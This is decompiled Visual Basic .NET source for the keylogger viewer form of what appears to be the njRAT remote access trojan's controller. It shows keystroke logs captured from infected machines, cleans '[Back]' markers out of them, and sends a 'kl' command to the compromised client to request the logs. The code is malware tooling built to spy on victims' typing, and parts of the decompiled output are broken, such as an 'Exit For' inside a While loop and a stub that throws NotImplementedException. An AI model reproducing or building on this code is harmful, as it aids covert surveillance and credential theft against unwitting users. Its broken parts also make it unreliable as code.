Imports System
Imports System.Collections.Generic
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.Runtime.CompilerServices
Imports System.Windows.Forms
Imports Microsoft.VisualBasic.CompilerServices

Namespace NJRAT
	' Token: 0x02000011 RID: 17
	<DesignerGenerated()>
	Public Partial Class kl
		Inherits Form

		' Token: 0x060002A7 RID: 679 RVA: 0x0001A344 File Offset: 0x00018544
		<DebuggerNonUserCode()>
		Private Shared Sub __ENCAddToList(value As Object)
			Dim _ENCList As List(Of WeakReference) = kl.__ENCList
			SyncLock _ENCList
				If kl.__ENCList.Count = kl.__ENCList.Capacity Then
					Dim num As Integer = 0
					Dim num2 As Integer = 0
					Dim num3 As Integer = kl.__ENCList.Count - 1
					Dim num4 As Integer = num2
					While True
						Dim num5 As Integer = num4
						Dim num6 As Integer = num3
						If num5 > num6 Then
							Exit For
						End If
						Dim weakReference As WeakReference = kl.__ENCList(num4)
						If weakReference.IsAlive Then
							If num4 <> num Then
								kl.__ENCList(num) = kl.__ENCList(num4)
							End If
							num += 1
						End If
						num4 += 1
					End While
					kl.__ENCList.RemoveRange(num, kl.__ENCList.Count - num)
					kl.__ENCList.Capacity = kl.__ENCList.Count
				End If
				kl.__ENCList.Add(New WeakReference(RuntimeHelpers.GetObjectValue(value)))
			End SyncLock
		End Sub

		' Token: 0x170000FA RID: 250
		' (get) Token: 0x060002AA RID: 682 RVA: 0x0001AFEC File Offset: 0x000191EC
		' (set) Token: 0x060002AB RID: 683 RVA: 0x00002841 File Offset: 0x00000A41
		Friend Overridable Property ProgressBar1 As ProgressBar
			<DebuggerNonUserCode()>
			Get
				Return Me._ProgressBar1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ProgressBar)
				Me._ProgressBar1 = value
			End Set
		End Property

		' Token: 0x170000FB RID: 251
		' (get) Token: 0x060002AC RID: 684 RVA: 0x0001B004 File Offset: 0x00019204
		' (set) Token: 0x060002AD RID: 685 RVA: 0x0000284A File Offset: 0x00000A4A
		Friend Overridable Property ContextMenuStrip1 As ContextMenuStrip
			<DebuggerNonUserCode()>
			Get
				Return Me._ContextMenuStrip1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ContextMenuStrip)
				Me._ContextMenuStrip1 = value
			End Set
		End Property

		' Token: 0x170000FC RID: 252
		' (get) Token: 0x060002AE RID: 686 RVA: 0x0001B01C File Offset: 0x0001921C
		' (set) Token: 0x060002AF RID: 687 RVA: 0x0001B034 File Offset: 0x00019234
		Friend Overridable Property CopyToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._CopyToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.CopyToolStripMenuItem_Click
				If Me._CopyToolStripMenuItem IsNot Nothing Then
					RemoveHandler Me._CopyToolStripMenuItem.Click, value2
				End If
				Me._CopyToolStripMenuItem = value
				If Me._CopyToolStripMenuItem IsNot Nothing Then
					AddHandler Me._CopyToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170000FD RID: 253
		' (get) Token: 0x060002B0 RID: 688 RVA: 0x0001B08C File Offset: 0x0001928C
		' (set) Token: 0x060002B1 RID: 689 RVA: 0x0001B0A4 File Offset: 0x000192A4
		Friend Overridable Property SelectAllToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._SelectAllToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.SelectAllToolStripMenuItem_Click
				If Me._SelectAllToolStripMenuItem IsNot Nothing Then
					RemoveHandler Me._SelectAllToolStripMenuItem.Click, value2
				End If
				Me._SelectAllToolStripMenuItem = value
				If Me._SelectAllToolStripMenuItem IsNot Nothing Then
					AddHandler Me._SelectAllToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170000FE RID: 254
		' (get) Token: 0x060002B2 RID: 690 RVA: 0x0001B0FC File Offset: 0x000192FC
		' (set) Token: 0x060002B3 RID: 691 RVA: 0x00002853 File Offset: 0x00000A53
		Friend Overridable Property FormSkin1 As FormSkin
			<DebuggerNonUserCode()>
			Get
				Return Me._FormSkin1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As FormSkin)
				Me._FormSkin1 = value
			End Set
		End Property

		' Token: 0x170000FF RID: 255
		' (get) Token: 0x060002B4 RID: 692 RVA: 0x0001B114 File Offset: 0x00019314
		' (set) Token: 0x060002B5 RID: 693 RVA: 0x0000285C File Offset: 0x00000A5C
		Friend Overridable Property T1 As RichTextBox
			<DebuggerNonUserCode()>
			Get
				Return Me._T1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As RichTextBox)
				Me._T1 = value
			End Set
		End Property

		' Token: 0x17000100 RID: 256
		' (get) Token: 0x060002B6 RID: 694 RVA: 0x0001B12C File Offset: 0x0001932C
		' (set) Token: 0x060002B7 RID: 695 RVA: 0x0001B144 File Offset: 0x00019344
		Friend Overridable Property FlatButton3 As FlatButton
			<DebuggerNonUserCode()>
			Get
				Return Me._FlatButton3
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As FlatButton)
				Dim value2 As EventHandler = AddressOf Me.FlatButton3_Click
				If Me._FlatButton3 IsNot Nothing Then
					RemoveHandler Me._FlatButton3.Click, value2
				End If
				Me._FlatButton3 = value
				If Me._FlatButton3 IsNot Nothing Then
					AddHandler Me._FlatButton3.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000101 RID: 257
		' (get) Token: 0x060002B8 RID: 696 RVA: 0x0001B19C File Offset: 0x0001939C
		' (set) Token: 0x060002B9 RID: 697 RVA: 0x0001B1B4 File Offset: 0x000193B4
		Friend Overridable Property FlatButton1 As FlatButton
			<DebuggerNonUserCode()>
			Get
				Return Me._FlatButton1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As FlatButton)
				Dim value2 As EventHandler = AddressOf Me.FlatButton1_Click
				If Me._FlatButton1 IsNot Nothing Then
					RemoveHandler Me._FlatButton1.Click, value2
				End If
				Me._FlatButton1 = value
				If Me._FlatButton1 IsNot Nothing Then
					AddHandler Me._FlatButton1.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000102 RID: 258
		' (get) Token: 0x060002BA RID: 698 RVA: 0x0001B20C File Offset: 0x0001940C
		' (set) Token: 0x060002BB RID: 699 RVA: 0x0001B224 File Offset: 0x00019424
		Friend Overridable Property FlatButton2 As FlatButton
			<DebuggerNonUserCode()>
			Get
				Return Me._FlatButton2
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As FlatButton)
				Dim value2 As EventHandler = AddressOf Me.FlatButton2_Click
				If Me._FlatButton2 IsNot Nothing Then
					RemoveHandler Me._FlatButton2.Click, value2
				End If
				Me._FlatButton2 = value
				If Me._FlatButton2 IsNot Nothing Then
					AddHandler Me._FlatButton2.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000103 RID: 259
		' (get) Token: 0x060002BC RID: 700 RVA: 0x0001B27C File Offset: 0x0001947C
		' (set) Token: 0x060002BD RID: 701 RVA: 0x00002865 File Offset: 0x00000A65
		Friend Overridable Property FlatMini2 As FlatMini
			<DebuggerNonUserCode()>
			Get
				Return Me._FlatMini2
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As FlatMini)
				Me._FlatMini2 = value
			End Set
		End Property

		' Token: 0x17000104 RID: 260
		' (get) Token: 0x060002BE RID: 702 RVA: 0x0001B294 File Offset: 0x00019494
		' (set) Token: 0x060002BF RID: 703 RVA: 0x0001B2AC File Offset: 0x000194AC
		Friend Overridable Property FlatButton4 As FlatButton
			<DebuggerNonUserCode()>
			Get
				Return Me._FlatButton4
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As FlatButton)
				Dim value2 As EventHandler = AddressOf Me.FlatButton4_Click
				If Me._FlatButton4 IsNot Nothing Then
					RemoveHandler Me._FlatButton4.Click, value2
				End If
				Me._FlatButton4 = value
				If Me._FlatButton4 IsNot Nothing Then
					AddHandler Me._FlatButton4.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000105 RID: 261
		' (get) Token: 0x060002C0 RID: 704 RVA: 0x0001B304 File Offset: 0x00019504
		' (set) Token: 0x060002C1 RID: 705 RVA: 0x0000286E File Offset: 0x00000A6E
		Friend Overridable Property PictureBox4 As PictureBox
			<DebuggerNonUserCode()>
			Get
				Return Me._PictureBox4
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As PictureBox)
				Me._PictureBox4 = value
			End Set
		End Property

		' Token: 0x17000106 RID: 262
		' (get) Token: 0x060002C2 RID: 706 RVA: 0x0001B31C File Offset: 0x0001951C
		' (set) Token: 0x060002C3 RID: 707 RVA: 0x00002877 File Offset: 0x00000A77
		Friend Overridable Property UserImage1 As UserImage
			<DebuggerNonUserCode()>
			Get
				Return Me._UserImage1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As UserImage)
				Me._UserImage1 = value
			End Set
		End Property

		' Token: 0x060002C4 RID: 708 RVA: 0x00002880 File Offset: 0x00000A80
		Public Sub New()
			kl.__ENCAddToList(Me)
			Me.listViewItem_0 = Nothing
			Me.InitializeComponent()
		End Sub

		' Token: 0x060002C5 RID: 709 RVA: 0x0001B334 File Offset: 0x00019534
		Public Sub insert(T As String)
			If T.StartsWith(ChrW(1)) And T.EndsWith(ChrW(1)) Then
				Me.T1.SelectionFont = New Font(Me.T1.Font, FontStyle.Bold)
				Me.T1.SelectionColor = Color.SteelBlue
				Me.T1.AppendText(vbCrLf & "[ " + T.Replace(ChrW(1), String.Empty) + "]" & vbCrLf)
			Else
				Me.T1.SelectionFont = Me.T1.Font
				Me.T1.SelectionColor = Me.T1.ForeColor
				Me.T1.AppendText(T + vbCrLf)
			End If
		End Sub

		' Token: 0x060002C6 RID: 710 RVA: 0x0000289B File Offset: 0x00000A9B
		Private Sub CopyToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Me.T1.Copy()
		End Sub

		' Token: 0x060002C7 RID: 711 RVA: 0x00002050 File Offset: 0x00000250
		Private Sub ToolStripMenuItem1_Click(sender As Object, e As EventArgs)
		End Sub

		' Token: 0x060002C8 RID: 712 RVA: 0x000028A8 File Offset: 0x00000AA8
		Private Sub SelectAllToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Me.T1.SelectAll()
		End Sub

		' Token: 0x060002C9 RID: 713 RVA: 0x0001B3F4 File Offset: 0x000195F4
		Private Sub ToolStripMenuItem2_Click(sender As Object, e As EventArgs)
			Dim t As Object = Me.T1
			Dim type As Type = Nothing
			Dim memberName As String = "Find"
			Dim array As Object() = New Object(2) {}
			Dim array2 As Object() = array
			Dim num As Integer = 0
			Dim instance As Object = Me.TFind()
			array2(num) = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(instance, Nothing, "Text", New Object(-1) {}, Nothing, Nothing, Nothing))
			array(1) = Me.T1.SelectionStart + Me.T1.SelectionLength
			array(2) = RichTextBoxFinds.None
			Dim array3 As Object() = array
			Dim arguments As Object() = array3
			Dim argumentNames As String() = Nothing
			Dim typeArguments As Type() = Nothing
			Dim array4 As Boolean() = New Boolean() { True, False, False }
			Dim left As Object = NewLateBinding.LateGet(t, type, memberName, arguments, argumentNames, typeArguments, array4)
			If array4(0) Then
				NewLateBinding.LateSetComplex(instance, Nothing, "Text", New Object() { RuntimeHelpers.GetObjectValue(array3(0)) }, Nothing, Nothing, True, True)
			End If
			If Operators.ConditionalCompareObjectEqual(left, -1, False) Then
				Dim t2 As Object = Me.T1
				Dim type2 As Type = Nothing
				Dim memberName2 As String = "Find"
				Dim array5 As Object() = New Object(2) {}
				Dim array6 As Object() = array5
				Dim num2 As Integer = 0
				Dim instance2 As Object = Me.TFind()
				array6(num2) = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(instance2, Nothing, "Text", New Object(-1) {}, Nothing, Nothing, Nothing))
				array5(1) = 0
				array5(2) = RichTextBoxFinds.None
				Dim array7 As Object() = array5
				Dim arguments2 As Object() = array7
				Dim argumentNames2 As String() = Nothing
				Dim typeArguments2 As Type() = Nothing
				Dim array8 As Boolean() = New Boolean() { True, False, False }
				NewLateBinding.LateCall(t2, type2, memberName2, arguments2, argumentNames2, typeArguments2, array8, True)
				If array8(0) Then
					NewLateBinding.LateSetComplex(instance2, Nothing, "Text", New Object() { RuntimeHelpers.GetObjectValue(array7(0)) }, Nothing, Nothing, True, True)
				End If
			End If
		End Sub

		' Token: 0x060002CA RID: 714 RVA: 0x0001B560 File Offset: 0x00019760
		Private Sub ToolStripMenuItem3_Click(sender As Object, e As EventArgs)
			Try
				Dim num As Integer = 1
				Dim dataObject As IDataObject = Clipboard.GetDataObject()
				Me.T1.[ReadOnly] = False
				While num <> -1
					num = Me.T1.Find("[Back]", num, RichTextBoxFinds.None)
					If num > 0 Then
						Dim left As String = Me.T1.Text(num - 1).ToString()
						If Operators.CompareString(left, "]", False) <> 0 AndAlso Operators.CompareString(left, vbLf, False) <> 0 Then
							Me.T1.[Select](num - 1, "[back]".Length + 1)
							Me.T1.Cut()
						Else
							Me.T1.[Select](num, "[back]".Length)
							Me.T1.Cut()
						End If
					End If
				End While
				Clipboard.SetDataObject(dataObject)
				Me.T1.[ReadOnly] = True
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x060002CB RID: 715 RVA: 0x00002050 File Offset: 0x00000250
		Private Sub TFind_Click(sender As Object, e As EventArgs)
		End Sub

		' Token: 0x060002CC RID: 716 RVA: 0x0001B3F4 File Offset: 0x000195F4
		Private Sub FlatButton1_Click(sender As Object, e As EventArgs)
			Dim t As Object = Me.T1
			Dim type As Type = Nothing
			Dim memberName As String = "Find"
			Dim array As Object() = New Object(2) {}
			Dim array2 As Object() = array
			Dim num As Integer = 0
			Dim instance As Object = Me.TFind()
			array2(num) = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(instance, Nothing, "Text", New Object(-1) {}, Nothing, Nothing, Nothing))
			array(1) = Me.T1.SelectionStart + Me.T1.SelectionLength
			array(2) = RichTextBoxFinds.None
			Dim array3 As Object() = array
			Dim arguments As Object() = array3
			Dim argumentNames As String() = Nothing
			Dim typeArguments As Type() = Nothing
			Dim array4 As Boolean() = New Boolean() { True, False, False }
			Dim left As Object = NewLateBinding.LateGet(t, type, memberName, arguments, argumentNames, typeArguments, array4)
			If array4(0) Then
				NewLateBinding.LateSetComplex(instance, Nothing, "Text", New Object() { RuntimeHelpers.GetObjectValue(array3(0)) }, Nothing, Nothing, True, True)
			End If
			If Operators.ConditionalCompareObjectEqual(left, -1, False) Then
				Dim t2 As Object = Me.T1
				Dim type2 As Type = Nothing
				Dim memberName2 As String = "Find"
				Dim array5 As Object() = New Object(2) {}
				Dim array6 As Object() = array5
				Dim num2 As Integer = 0
				Dim instance2 As Object = Me.TFind()
				array6(num2) = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(instance2, Nothing, "Text", New Object(-1) {}, Nothing, Nothing, Nothing))
				array5(1) = 0
				array5(2) = RichTextBoxFinds.None
				Dim array7 As Object() = array5
				Dim arguments2 As Object() = array7
				Dim argumentNames2 As String() = Nothing
				Dim typeArguments2 As Type() = Nothing
				Dim array8 As Boolean() = New Boolean() { True, False, False }
				NewLateBinding.LateCall(t2, type2, memberName2, arguments2, argumentNames2, typeArguments2, array8, True)
				If array8(0) Then
					NewLateBinding.LateSetComplex(instance2, Nothing, "Text", New Object() { RuntimeHelpers.GetObjectValue(array7(0)) }, Nothing, Nothing, True, True)
				End If
			End If
		End Sub

		' Token: 0x060002CD RID: 717 RVA: 0x0001B668 File Offset: 0x00019868
		Private Function TFind() As Object
			Throw New NotImplementedException()
		End Function

		' Token: 0x060002CE RID: 718 RVA: 0x0001B67C File Offset: 0x0001987C
		Private Sub FlatButton2_Click(sender As Object, e As EventArgs)
			Try
				Me.c.Send("kl")
				Me.FlatButton2.Enabled = False
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x060002CF RID: 719 RVA: 0x00002050 File Offset: 0x00000250
		Private Sub FlatButton3_Click(sender As Object, e As EventArgs)
		End Sub

		' Token: 0x060002D0 RID: 720 RVA: 0x00002199 File Offset: 0x00000399
		Private Sub FlatButton4_Click(sender As Object, e As EventArgs)
			Me.Close()
		End Sub

		' Token: 0x04000129 RID: 297
		Private Shared __ENCList As List(Of WeakReference) = New List(Of WeakReference)()

		' Token: 0x0400012B RID: 299
		<AccessedThroughProperty("ProgressBar1")>
		Private _ProgressBar1 As ProgressBar

		' Token: 0x0400012C RID: 300
		<AccessedThroughProperty("ContextMenuStrip1")>
		Private _ContextMenuStrip1 As ContextMenuStrip

		' Token: 0x0400012D RID: 301
		<AccessedThroughProperty("CopyToolStripMenuItem")>
		Private _CopyToolStripMenuItem As ToolStripMenuItem

		' Token: 0x0400012E RID: 302
		<AccessedThroughProperty("SelectAllToolStripMenuItem")>
		Private _SelectAllToolStripMenuItem As ToolStripMenuItem

		' Token: 0x0400012F RID: 303
		<AccessedThroughProperty("FormSkin1")>
		Private _FormSkin1 As FormSkin

		' Token: 0x04000130 RID: 304
		<AccessedThroughProperty("T1")>
		Private _T1 As RichTextBox

		' Token: 0x04000131 RID: 305
		<AccessedThroughProperty("FlatButton3")>
		Private _FlatButton3 As FlatButton

		' Token: 0x04000132 RID: 306
		<AccessedThroughProperty("FlatButton1")>
		Private _FlatButton1 As FlatButton

		' Token: 0x04000133 RID: 307
		<AccessedThroughProperty("FlatButton2")>
		Private _FlatButton2 As FlatButton

		' Token: 0x04000134 RID: 308
		<AccessedThroughProperty("FlatMini2")>
		Private _FlatMini2 As FlatMini

		' Token: 0x04000135 RID: 309
		<AccessedThroughProperty("FlatButton4")>
		Private _FlatButton4 As FlatButton

		' Token: 0x04000136 RID: 310
		<AccessedThroughProperty("PictureBox4")>
		Private _PictureBox4 As PictureBox

		' Token: 0x04000137 RID: 311
		<AccessedThroughProperty("UserImage1")>
		Private _UserImage1 As UserImage

		' Token: 0x04000138 RID: 312
		Public c As Client

		' Token: 0x04000139 RID: 313
		Private listViewItem_0 As ListViewItem
	End Class
End Namespace
